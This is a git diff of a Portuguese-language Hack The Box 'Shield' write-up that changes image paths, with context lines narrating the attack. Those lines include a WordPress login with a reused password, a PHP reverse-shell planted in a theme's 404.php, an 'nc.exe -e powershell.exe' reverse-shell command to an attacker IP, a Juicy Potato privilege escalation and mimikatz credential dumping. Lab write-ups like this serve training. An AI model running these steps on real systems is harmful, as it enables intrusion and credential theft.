@@ -4,11 +4,11 @@ author: Hastur
 date: 2021-09-06 22:00:00 -0300
 categories: [Writeups, Hack The Box]
 tags: [HTB, Starting point, Windows, Very Easy, Web, WordPress, Juice Potato, Mimikatz, PHP]
-image: /htb/htb-shield-logo.png
+image: /img/htb/htb-shield-logo.png
 alt: "HTB Shield Writeup"
 ---
 
-<img src="/htb/htb-shield-logo.png">
+<img src="/img/htb/htb-shield-logo.png">
 
 <br>
 
@@ -51,7 +51,7 @@ Desta vez sabemos que há grandes chances de estarmos lidando com o Windows Serv
 
 ### Porta 80
 
-<img src="/htb/htb-shield-1.png">
+<img src="/img/htb/htb-shield-1.png">
 
 Nos deparamos com a página padrão do IIS HTTPD, o que nos dá uma boa informação. Mas precisamos de algo mais, vamos fazer uma varredura de diretórios com `gobuster`.
 
@@ -82,17 +82,17 @@ http://10.10.10.29/wordpress            (Status: 200) [Size: 24088]
 ```
 A varredura nos trouxe o diretório `/wordpress`, o que é uma informação muito valiosa.
 
-<img src="/htb/htb-shield-2.png">
+<img src="/img/htb/htb-shield-2.png">
 
 O Wordpress é um CMS (Content Management System) que permite a rápida criação de sites e blogs.
 
 Por padrão, o usuário precisa se autenticar no CMS e configurar e editar todo o blog/site. Sua página de autentucação, por padrão fica em `wp-login.php`, vamos verificar se esta página está com as configurações padrão, acessando [http://10.10.10.29/wordpress/wp-login.php](http://10.10.10.29/wordpress/wp-login.php).
 
-<img src="/htb/htb-shield-3.png">
+<img src="/img/htb/htb-shield-3.png">
 
 Neste ponto, temos várias credenciais das máquinas anteriores do `Starting Point`, tentando com algumas delas, conseguimos acesso com `admin:P@s5w0rd!`, a senha da ultima máquina [Vaccine](https://hastur666.github.io/posts/htb-vaccine-writeup/).
 
-<img src="/htb/htb-shield-4.png">
+<img src="/img/htb/htb-shield-4.png">
 
 O Wordpress também roda em PHP, o que nos dá brecha para tentarmos um acesso remoto editando alguma página com um payload.
 
@@ -100,7 +100,7 @@ No menu à direita, temos as opções de edição, se clicarmos em `Appearance >
 
 Se selecionarmos o tema `GutenBooster`, podemos editar o código fonte da página `404.php`.
 
-<img src="/htb/htb-shield-5.png">
+<img src="/img/htb/htb-shield-5.png">
 
 Ao editar a página, podemos inserir um payload de conexão reversa, no meu caso utilizarei o seguinte:
 
@@ -286,7 +286,7 @@ unset($sh);
 echo '</pre>';
 
 ```
-<img src="/htb/htb-shield-6.png">
+<img src="/img/htb/htb-shield-6.png">
 
 Ao clicar em `Update File`, nós salvamos a alteração. Precisamos setar um `netcat`, na porta escolhida, no meu caso 8443 e em seguida fazer um curl para o endereço da página `404.php`.
 
@@ -299,7 +299,7 @@ Por padrão, o Wordpress salva seus recursos de tema em `wp-content/<nome do tem
 
 E conseguimos o shell.
 
-<img src="/htb/htb-shield-7.png">
+<img src="/img/htb/htb-shield-7.png">
 
 Esta máquina também não possui a flag de usuário, portanto, precisamos efetuar a escalação de privilégios.
 
@@ -378,11 +378,11 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 Porém, só conseguimos fazer upload em um diretório em que o usuário tenha permissão de escrita, normalmente o usuário do webserver tem permissões de escrita no diretório `/wp-content/uploads`, vamos navegar até lá.
 
-<img src="/htb/htb-shield-8.png">
+<img src="/img/htb/htb-shield-8.png">
 
 Agora podemos requisitar para nosso HTTP server.
 
-<img src="/htb/htb-shield-9.png">
+<img src="/img/htb/htb-shield-9.png">
 
 Com o exploit no alvo, precisamos de uma forma de executá-lo e obter acesso administrativo.
 
@@ -394,14 +394,14 @@ Poém, para obter a conexão reversa, precisamos de algum executável que possa 
 
 No diretório `/usr/share/windows-binaries/` encontramos o `nc.exe`, que podemos copiar para o nosso diretório atual e subir para nosso alvo da mesma forma que subimos o exploit.
 
-<img src="/htb/htb-shield-10.png">
+<img src="/img/htb/htb-shield-10.png">
 
 Com o netcat na máquina alvo, podemos usar o próprio `echo` do Windows para criarmos um script `reverse.bat` com o comando para nos enviar um Power Shell com o netcat.
 
 ```cmd
 C:\inetpub\wwwroot\wordpress\wp-content\uploads>echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.15.185 8444 > reverse.bat  
 ```
-<img src="/htb/htb-shield-11.png">
+<img src="/img/htb/htb-shield-11.png">
 
 Com tuddo pronto, podemos setar um netcat para ouvir na porta 8444, que foi a utilizada em nosso script e enviar o comando para o exploit.
 
@@ -417,7 +417,7 @@ Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 
 O exploit executou nosso script e nos deu um reverse shell com privilégios administrativos!!!
 
-<img src="/htb/htb-shield-12.png">
+<img src="/img/htb/htb-shield-12.png">
 
 A flag `root.txt` se encontra no Desktop do Administrator.
 
@@ -427,11 +427,11 @@ Ainda podemos checar a possibilidade de obter senhas de outros usuários do Wind
 
 Na própria distribuição Kali Linux, no diretório `/usr/share/windows-resources/`, encontramos mais executáveis, entre eles o `mimikatz.exe`, podemos copiar a versão de 64 bits para nosso diretório atual e subir para o alvo da mesma forma que fizemos antes.
 
-<img src="/htb/htb-shield-13.png">
+<img src="/img/htb/htb-shield-13.png">
 
 Agora em nosso shell administrativo, podemos executá-lo.
 
-<img src="/htb/htb-shield-14.png">
+<img src="/img/htb/htb-shield-14.png">
 
 Com o comando `sekurlsa::logonpasswords`, obtemos o dump de todos as senhas em cache.
 
@@ -664,7 +664,7 @@ E entre os dados do dump, conseguimos as seguintes credenciais:
 E comprometemos o server!!
 <br>
 
-<img src="/htb/hackerman.gif">
+<img src="/img/htb/hackerman.gif">
 <br>
 ### Referências
 
